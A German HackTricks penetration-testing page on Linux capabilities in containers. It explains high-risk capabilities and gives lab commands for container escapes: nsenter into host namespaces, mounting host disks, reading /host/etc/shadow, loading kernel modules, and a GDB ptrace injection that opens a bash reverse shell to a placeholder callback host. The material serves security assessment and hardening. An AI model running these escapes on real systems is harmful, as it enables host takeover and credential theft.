# Linux Capabilities In Containern

{{#include ../../../../banners/hacktricks-training.md}}

## Übersicht

Linux capabilities gehören zu den wichtigsten Bestandteilen der container security, da sie eine subtile, aber grundlegende Frage beantworten: **Was bedeutet „root“ wirklich innerhalb eines Containers?** Auf einem normalen Linux-System bedeutete UID 0 historisch einen sehr umfangreichen Satz an Berechtigungen. In modernen Kernels wird diese Berechtigung in kleinere Einheiten zerlegt, die als capabilities bezeichnet werden. Ein Prozess kann als root ausgeführt werden und dennoch viele mächtige Operationen nicht durchführen können, wenn die entsprechenden capabilities entfernt wurden. <sup>[[1]](#references)</sup>

Container machen sich diese Unterscheidung intensiv zunutze. Viele Workloads werden aus Gründen der Kompatibilität oder Einfachheit weiterhin als UID 0 innerhalb des Containers gestartet. Ohne das Entfernen von capabilities wäre das viel zu gefährlich. Durch das Entfernen von capabilities kann ein containerisierter root-Prozess weiterhin viele gewöhnliche Aufgaben innerhalb des Containers ausführen, während ihm der Zugriff auf sensiblere Kernel-Operationen verweigert wird. Deshalb bedeutet eine Container-Shell, die `uid=0(root)` anzeigt, nicht automatisch „host root“ oder auch nur „umfassende Kernel-Berechtigung“. Die capability-Sets bestimmen, wie viel diese root-Identität tatsächlich wert ist.

Die vollständige Linux-capability-Referenz und viele Missbrauchsbeispiele findest du hier:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Operation

Capabilities werden in mehreren Sets verwaltet, darunter permitted, effective, inheritable, ambient und bounding sets. Für viele Container-Assessments sind die exakten Kernel-Semantiken jedes einzelnen Sets weniger unmittelbar wichtig als die abschließende praktische Frage: **Welche privilegierten Operationen kann dieser Prozess jetzt erfolgreich durchführen, und welche zukünftigen Privilege-Gains sind noch möglich?** <sup>[[1]](#references)</sup>

Der Grund für diese Bedeutung ist, dass viele Breakout-Techniken tatsächlich capability-Probleme sind, die als Container-Probleme getarnt sind. Ein Workload mit `CAP_SYS_ADMIN` kann auf eine enorme Menge an Kernel-Funktionalität zugreifen, die ein normaler Container-root-Prozess nicht verwenden sollte. Ein Workload mit `CAP_NET_ADMIN` wird noch gefährlicher, wenn er zusätzlich den Host-Network-Namespace teilt. Ein Workload mit `CAP_SYS_PTRACE` wird deutlich interessanter, wenn er Host-Prozesse über das gemeinsame Verwenden der Host-PID-Namespace sehen kann. In Docker oder Podman kann dies als `--pid=host` erscheinen; in Kubernetes tritt dies normalerweise als `hostPID: true` auf.

Mit anderen Worten: Das capability-Set kann nicht isoliert bewertet werden. Es muss zusammen mit Namespaces, seccomp und der MAC policy betrachtet werden.

## Labor

Eine sehr direkte Möglichkeit, capabilities innerhalb eines Containers zu untersuchen, ist:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Sie können außerdem einen restriktiveren Container mit einem vergleichen, dem alle Capabilities hinzugefügt wurden:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Um die Auswirkungen einer gezielten Ergänzung zu sehen, entfernen Sie zunächst alles und fügen Sie anschließend nur eine einzige Capability wieder hinzu:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Diese kleinen Experimente helfen zu zeigen, dass eine Runtime nicht einfach einen Boolean namens "privileged" umschaltet. Sie formt die tatsächliche Privilege-Oberfläche, die dem Prozess zur Verfügung steht.

## Hochrisiko-Capabilities

Capabilities werden nur dann zu Escape-Primitiven, wenn ihre Operation eine **vom Host kontrollierte Ressource** erreicht. Die wiederkehrenden Hochrisiko-Kombinationen sind:

- **`CAP_SYS_ADMIN`** plus eine Host-PID, ein Blockgerät oder ein beschreibbarer Kernel-Control-Pfad. Das Beitreten zu einem Ziel-Mount-Namespace erfordert zusätzlich `CAP_SYS_CHROOT`; das Mounten eines blockbasierten Dateisystems erfordert `CAP_SYS_ADMIN` im initialen User-Namespace.
- **`CAP_SYS_PTRACE`** plus Sichtbarkeit von Host-PIDs und ein attachbarer Host-Prozess. `CAP_SYS_ADMIN` ist für ptrace-Injection nicht erforderlich.
- **`CAP_DAC_OVERRIDE` oder `CAP_DAC_READ_SEARCH`** plus ein erreichbares Host-Dateisystem. Diese Capabilities umgehen unterschiedliche DAC-Prüfungen, erzeugen aber keine Sicht auf ein Host-Dateisystem.
- **`CAP_SYS_MODULE`** im initialen User-Namespace plus ein akzeptiertes, kernelkompatibles Modul. Gewöhnliche Linux-Container teilen sich den Node-Kernel; VM- oder Userspace-Kernel-Runtimes verändern diese Grenze.
- **`CAP_MKNOD`** im initialen User-Namespace plus ein echtes Host-Gerät, das der Device-cgroup bereits erlaubt. Das Erstellen eines Device-Nodes umgeht die Device-cgroup nicht.
- **`CAP_SYS_RAWIO`** plus eine exponierte und nutzbare Memory-, I/O-Port-, PCI- oder Device-Control-Schnittstelle.
- **`CAP_SYS_BOOT`** plus der initiale PID-Namespace für einen Host-Reboot oder ein nutzbarer und erlaubter kexec-Pfad für den Kernel-Ersatz.
- **`CAP_NET_ADMIN`** im Host-Network-Namespace für die direkte Kontrolle des Netzwerkstatus des Nodes. **`CAP_NET_RAW`** kann an einem protokollspezifischen Escape beteiligt sein, aber Raw-Sockets allein ergeben keine Node-Shell.

`CAP_SYS_CHROOT` ist absichtlich nicht als eigenständige Escape-Capability aufgeführt. Sie kann von `setns()` für einen Mount-Namespace benötigt werden und die Nutzung eines bereits zugänglichen Host-Baums erleichtern, aber `chroot()` allein legt diesen Baum weder offen noch gewährt es neue Dateisystemberechtigungen. Ebenso legen `CAP_BPF` und `CAP_PERFMON` eine leistungsfähige Telemetrie- und Kernel-Angriffsfläche offen, aber ohne einen separaten Kernel-Fehler sind ihre gewöhnlichen Operationen keine generischen Container-Escapes.

## Verwendung durch die Runtime

Docker, Podman, containerd-basierte Stacks und CRI-O verwenden alle Capability-Kontrollen, aber die Defaults und Management-Schnittstellen unterscheiden sich. Docker stellt sie direkt über Flags wie `--cap-drop` und `--cap-add` bereit. Podman bietet ähnliche Kontrollen und kombiniert sie häufig mit Rootless-Ausführung als zusätzlicher Sicherheitsebene. Kubernetes stellt Capability-Adds und -Drops über den `securityContext` des Pods oder Containers bereit; Low-Level-Runtimes drücken die resultierenden Sets in der OCI-Runtime-Konfiguration aus. System-Container-Umgebungen wie LXC und Incus verwenden ebenfalls Capability-Kontrollen, aber ihre umfassendere Host-Integration kann Betreiber dazu verleiten, Defaults aggressiver zu lockern, als sie es bei einem Application-Container tun würden. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

Dasselbe Prinzip gilt für alle: Eine Capability, deren Vergabe technisch möglich ist, sollte nicht automatisch auch vergeben werden. Viele reale Vorfälle beginnen damit, dass ein Betreiber eine Capability hinzufügt, weil ein Workload unter einer strengeren Konfiguration fehlschlug und das Team eine schnelle Lösung benötigte.

## Fehlkonfigurationen

Der offensichtlichste Fehler ist **`--cap-add=ALL`** in Docker-/Podman-ähnlichen CLIs, aber er ist nicht der einzige. In der Praxis besteht ein häufigeres Problem darin, eine oder zwei extrem mächtige Capabilities, insbesondere `CAP_SYS_ADMIN`, zu vergeben, um "die Anwendung zum Laufen zu bringen", ohne zugleich die Auswirkungen auf Namespace, seccomp und Mounts zu verstehen. Ein weiterer häufiger Fehler ist die Kombination zusätzlicher Capabilities mit dem Teilen von Host-Namespaces. In Docker oder Podman kann dies als `--pid=host`, `--network=host` oder `--userns=host` erscheinen; in Kubernetes zeigt sich die entsprechende Offenlegung normalerweise durch Workload-Einstellungen wie `hostPID: true` oder `hostNetwork: true`. Jede dieser Kombinationen verändert, worauf die Capability tatsächlich Einfluss nehmen kann.

Ebenso häufig glauben Administratoren, dass ein Workload, weil er nicht vollständig `--privileged` ist, weiterhin sinnvoll eingeschränkt ist. Manchmal stimmt das, aber manchmal ist die effektive Sicherheitslage bereits so nah an privileged, dass der Unterschied im operativen Betrieb keine Rolle mehr spielt.

## Missbrauch

Beginne damit, die effektiven Sets, das User-Namespace-Mapping, den seccomp-Status, Namespaces, Mounts und Devices zu dokumentieren. Ein Capability-Name ohne diesen Kontext beweist keinen Escape:
```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```
### `CAP_SYS_ADMIN`: Namespaces und Blockgeräte

Bei sichtbaren Host-PIDs kann `CAP_SYS_ADMIN` in Host-Namespaces wechseln. Die Mount-Namespace-Operation benötigt außerdem `CAP_SYS_CHROOT` im User-Namespace des Aufrufers.

**Capability und Einschränkung prüfen:**
```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```
**Enumerate das Ziel:** Bestätige das Host-PID-Sharing anhand der Container-/Pod-Konfiguration oder einer unmissverständlichen Host-Prozessliste und untersuche anschließend die Ziel-Namespaces. Eine lokale PID 1 existiert auch in privaten PID-Namespaces; ihre bloße Existenz beweist daher kein Host-PID-Sharing.
```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```
**Namespace-Pfad ausnutzen:**
```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```
Die capability-Prüfungen müssen in den User-Namespaces erfolgreich sein, denen die Ziele gehören. `--pid=host` oder Kubernetes `hostPID: true` stellt Sichtbarkeit bereit, jedoch nicht die capabilities.

Für den alternativen Blockgeräte-Pfad **enumerate** zunächst die Kandidaten und **exploit** anschließend das zugängliche Dateisystem, indem du den validierten Kandidaten zuerst schreibgeschützt mountest:
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```
Der Geräteteノ muss vorhanden sein, die Device-cgroup muss ihn erlauben, und Block-Dateisystem-Mounts erfordern `CAP_SYS_ADMIN` im initialen User-Namespace. Ein bereits unter `/host` per Bind-Mount eingebundenes Host-Root ermöglicht den Host-Zugriff **ohne** `CAP_SYS_ADMIN`; `chroot /host` ist lediglich eine Komfortfunktion und erfordert separat `CAP_SYS_CHROOT`.

### Erreichbarer Host-Root: direkte Dateisystemausführung

Wenn der Host-Root bereits unter `/host` gemountet ist, bestätige zuerst den Mount und verwende anschließend den bestehenden Zugriff direkt. Dieser Pfad hängt nicht von `CAP_SYS_ADMIN` ab:
```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```
Wenn `chroot()` nicht verfügbar ist, die Host-Binärdatei jedoch mit der Architektur und dem Loader des Containers kompatibel ist, kann sie häufig stattdessen über den eingehängten Baum aufgerufen werden:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
Direkte Lese- und Schreibzugriffe unter `/host` stellen bereits eine Kompromittierung des Host-Dateisystems dar. `chroot()` oder das Ausführen eines Host-Binaries machen diesen Zugriff lediglich bequemer; keine der beiden Operationen erstellt den Host-Mount oder umgeht einen Read-only-Mount bzw. eine MAC policy.

### `CAP_SYS_PTRACE`: Injection in Host-Prozesse

Bei sichtbaren Host-PIDs und `CAP_SYS_PTRACE` im User-Namespace des Zielprozesses kann GDB einen freigegebenen Host-Prozess dazu bringen, `system()` aufzurufen. `CAP_SYS_ADMIN` ist nicht erforderlich.

**Prüfe die Capability- und Attachment-Kontrollen:**
```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```
**Ein entbehrliches Ziel bestimmen und auswählen:** Bestätige die gemeinsame Nutzung der Host-PIDs anhand der Konfiguration oder einer eindeutigen Prozessliste des Knotens; wähle niemals PID 1 oder einen kritischen Daemon aus.
```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
"/proc/${target_pid}/status"
```
**Exploit des ausgewählten Prozesses:**
```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
-ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
-ex detach
```
Das Ziel muss anhängbar sein und über ein nutzbares `system()`-Symbol sowie einen Bash-Payload-Pfad verfügen. Yama, der nicht dumpbare Zustand, seccomp, User namespaces und MAC-Richtlinien können die Kette blockieren. GDB hält das Ziel während des Anhängens an. Verwende daher ausschließlich einen entbehrlichen Laborprozess.

### `CAP_DAC_OVERRIDE` und `CAP_DAC_READ_SEARCH`: geschützte Host-Dateien

Diese Capabilities legen das Host-Dateisystem nicht offen. Wenn `/host` bereits ein Host-Mount ist, kann `CAP_DAC_READ_SEARCH` DAC-Prüfungen für das Lesen und Suchen umgehen, und `CAP_DAC_OVERRIDE` kann zusätzlich gewöhnliche Schreibprüfungen umgehen:

**Capabilities prüfen:**
```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```
**Das offengelegte Host-Dateisystem auflisten und Zielberechtigungen ermitteln:**
```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
/host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```
**Teste die Read- und Write-Bypässe** in einer temporären Laborumgebung:
```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```
Ein schreibgeschützter Mount und LSM-Regeln gelten weiterhin. `CAP_DAC_READ_SEARCH` autorisiert außerdem `open_by_handle_at()`, aber ein breakout wie Shocker benötigt zusätzlich einen Mount-Dateideskriptor für dasselbe zugrunde liegende Dateisystem, gültige oder auffindbare Handles, ein kompatibles Dateisystem-/Storage-Layout sowie keine Sperre durch Runtime oder LSM. Es ermöglicht keinen beliebigen Zugriff auf jedes Dateisystem außerhalb des Mount-Namespace.

### `CAP_SYS_MODULE`: Ausführung im gemeinsam genutzten Kernel

In einem gewöhnlichen Linux-Container wird ein akzeptiertes Modul im gemeinsam genutzten Host-Kernel ausgeführt.

**Prüfe die Capability und den Gültigkeitsbereich des User-Namespace:**
```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Voraussetzungen für das Laden von Modulen aufzählen:**
```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
"/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```
**Exploit nur mit einem kompatiblen, vorab geprüften Proof-Modul auf einem wegwerfbaren Node:**
```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```
Die Capability muss im initialen User-Namespace wirksam sein. Kernel-Version und -Konfiguration, Modul-Signaturen, Lockdown, seccomp und die LSM-Richtlinie müssen das Laden erlauben. Kata, gVisor, Hyper-V-Isolation und ähnliche Runtimes ändern, welche Kernel-Grenze die Workload erreicht.

### `CAP_MKNOD`: einen zulässigen Geräte-Handle erstellen

`CAP_MKNOD` erstellt einen Gerätedateiknoten, umgeht aber nicht die Device-cgroup. Das Erstellen von Geräten ist nicht namespaced, daher muss die Capability im initialen User-Namespace wirksam sein.

**Capability und den Geltungsbereich des User-Namespace prüfen:**
```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Zähle die tatsächlichen Geräte, ihre Major-/Minor-Nummern und jede sichtbare cgroup-v1-Allowlist auf:**
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```
**Exploit einen validierten ext-family-Kandidaten read-only:**
```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```
Andere Dateisysteme benötigen ein entsprechendes schreibgeschütztes Tool; für das zusätzliche Mounten des Geräts ist außerdem `CAP_SYS_ADMIN` erforderlich. `Operation not permitted` beim Öffnen des erstellten Nodes weist normalerweise darauf hin, dass die Device-Cgroup den Zugriff weiterhin blockiert. Unter cgroup v2 wird der Device-Zugriff üblicherweise mit BPF erzwungen, und es gibt keine Datei `devices.list`; daher ist ein erfolgreiches Öffnen der entscheidende Test.

### `CAP_SYS_RAWIO`: offengelegte Raw-I/O-Schnittstelle

Es gibt keinen portablen generischen Payload: Gültige Adressen und Auswirkungen hängen von der Hardware und der Kernel-Konfiguration ab.

**Prüfe die Capability und den Geltungsbereich des User-Namespaces:**
```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Auflisten der exponierten Raw-Schnittstellen, Hardware und Treiber:**
```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```
**Exploit nur mit einem genehmigten Nachweis für das identifizierte Gerät und den Adressbereich.** Wenn `/dev/mem` die im Labor genehmigte Schnittstelle ist, weist dieses Template die Offenlegung des Node-Speichers nach, ohne dessen Inhalt auszugeben:
```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```
Die Adresse muss aus der Hardware-Map des Labs stammen, da das Lesen bestimmter MMIO-Regionen Nebenwirkungen haben kann. Ein generischer Memory-Write-Befehl wäre irreführend und unsicher: Dieselbe Adresse kann auf einem Rechner harmlos sein und auf einem anderen Hardware oder Kernel-Speicher steuern. Device cgroups, Dateisystemberechtigungen, striktes `/dev/mem`, Kernel-Lockdown, Virtualisierung und LSM-Richtlinien verhindern häufig einen nützlichen Zugriff.

### `CAP_SYS_BOOT`: Neustart des Namespace oder Ersetzen des Kernels

In einem privaten PID-Namespace beendet `reboot()` den Init-Prozess dieses Namespace, anstatt den Host neu zu starten. Auswirkungen auf den Neustart des Hosts erfordern daher den initialen PID-Namespace, normalerweise über die gemeinsame Nutzung der Host-PIDs. Ein kexec-Pfad benötigt außerdem ein kompatibles Kernel-Image und eine freizügige Lockdown-/Signatur-Richtlinie:

**Prüfe die Capability:**
```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Zähle die Voraussetzungen für PID-Namespaces und kexec auf:** Bestätige die gemeinsame Nutzung der Host-PIDs anhand der Workload-Konfiguration, da ein Link zu einem PID-Namespace allein nicht erkennen lässt, ob es sich um den initialen Namespace des Nodes handelt.
```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```
**Exploit nur, wenn der Neustart eines Wegwerf-Laborknotens ausdrücklich Teil der Übung ist:**
```bash
sync
reboot -f
```
Gib diesen Befehl nicht aus und lade auf einem gemeinsam genutzten Node keinen Kernel, nur um die Capability nachzuweisen. In einem privaten PID-Namespace beendet er nur den Init-Prozess dieses Namespace und zeigt keine Auswirkungen auf den Host.

### `CAP_NET_ADMIN` und `CAP_NET_RAW`: Host-Netzwerkpfade

`CAP_NET_ADMIN` wirkt sich nur auf den aktuellen Netzwerk-Namespace aus.

**Prüfe die Capabilities und die Isolation:**
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```
**Enumerieren Sie das aktuelle Netzwerk und bestätigen Sie das Host-Networking anhand der Workload-Konfiguration:**
```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```
**Exercise `CAP_NET_ADMIN` reversibel:** Bei Host-Netzwerk ist das temporäre Interface ein Node-Interface.
```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```
`CAP_NET_RAW` erlaubt RAW- und PACKET-Sockets, ist aber keine generische Host-Shell. Um die dokumentierte GCE-Kette zu **enumerieren**, überprüfe die Metadatenroute und erfasse, ob Klartextverkehr des Guest-Agent beobachtbar ist:
```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```
Wenn die passenden Voraussetzungen erfüllt sind, **exploit** die umgebungsspezifische Kette wie unter [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html) dokumentiert: Erfasse den Request- und Sequenzstatus, injiziere die gefälschte Metadatenantwort mit einem SSH-Schlüssel und validiere anschließend den Host-Zugriff. Die Kette erforderte root, Host-Networking, `CAP_NET_ADMIN`, `CAP_NET_RAW`, unverschlüsselten GCE-Metadatenverkehr und einen Race-fähigen Guest-Agent-Request; moderne Transport- oder Agent-Verhaltensweisen können sie beeinträchtigen.

## Checks

Das Ziel der Capability-Prüfungen besteht nicht nur darin, rohe Werte auszugeben, sondern auch zu verstehen, ob der Prozess über ausreichende Berechtigungen verfügt, um seine aktuelle Namespace- und Mount-Situation gefährlich zu machen.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Was ist hier interessant:

- `capsh --print` ist die einfachste Möglichkeit, risikoreiche Capabilities wie `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` oder `cap_sys_module` zu erkennen.
- Die Zeile `CapEff` in `/proc/self/status` zeigt, welche Capabilities derzeit tatsächlich aktiv sind, nicht nur, welche in anderen Sets verfügbar sein könnten.
- Ein Capability-Dump wird besonders wichtig, wenn der Container außerdem den Host-PID-, Netzwerk- oder User-Namespace gemeinsam nutzt oder über beschreibbare Host-Mounts verfügt.

Nach dem Sammeln der rohen Capability-Informationen besteht der nächste Schritt in der Interpretation. Prüfe, ob der Prozess als root läuft, ob User-Namespaces aktiv sind, ob Host-Namespaces gemeinsam genutzt werden, ob seccomp erzwingend aktiv ist und ob AppArmor oder SELinux den Prozess weiterhin einschränken. Ein Capability-Set allein ist nur ein Teil des Gesamtbildes, aber oft der Teil, der erklärt, warum ein Container breakout funktioniert und ein anderer mit demselben scheinbaren Ausgangspunkt scheitert.

## Runtime-Standards

| Runtime / Plattform | Standardzustand | Standardverhalten | Häufige manuelle Abschwächung |
| --- | --- | --- | --- |
| Docker Engine | Standardmäßig reduziertes Capability-Set | Docker behält standardmäßig eine Allowlist von Capabilities bei und entfernt den Rest | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Standardmäßig reduziertes Capability-Set | Podman-Container sind standardmäßig unprivileged und verwenden ein reduziertes Capability-Modell | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Übernimmt die Runtime-Standards, sofern sie nicht geändert werden | Wenn keine `securityContext.capabilities` angegeben werden, erhält der Container das Standard-Capability-Set der Runtime | `securityContext.capabilities.add`, `drop: [\"ALL\"]` nicht zu setzen, `privileged: true` |
| containerd / CRI-O unter Kubernetes | Üblicherweise Runtime-Standard | Das effektive Set hängt von der Runtime und der Pod-Spezifikation ab | Wie in der Kubernetes-Zeile; auch die direkte OCI/CRI-Konfiguration kann Capabilities explizit hinzufügen |

Für Kubernetes ist entscheidend, dass die API kein einheitliches universelles Standard-Capability-Set definiert. Wenn der Pod keine Capabilities hinzufügt oder entfernt, übernimmt die Workload den Runtime-Standard des jeweiligen Nodes.

## References

- [1] [capabilities(7) - Linux-Handbuchseite](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - Linux-Container-Konfiguration](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Docker Docs - Runtime-Privilegien und Linux-Capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Kubernetes-Dokumentation - Capabilities für einen Container festlegen](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Podman-Dokumentation - `--cap-add` und `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Incus-Dokumentation - Sicherheit](https://linuxcontainers.org/incus/docs/main/explanation/security/)
{{#include ../../../../banners/hacktricks-training.md}}
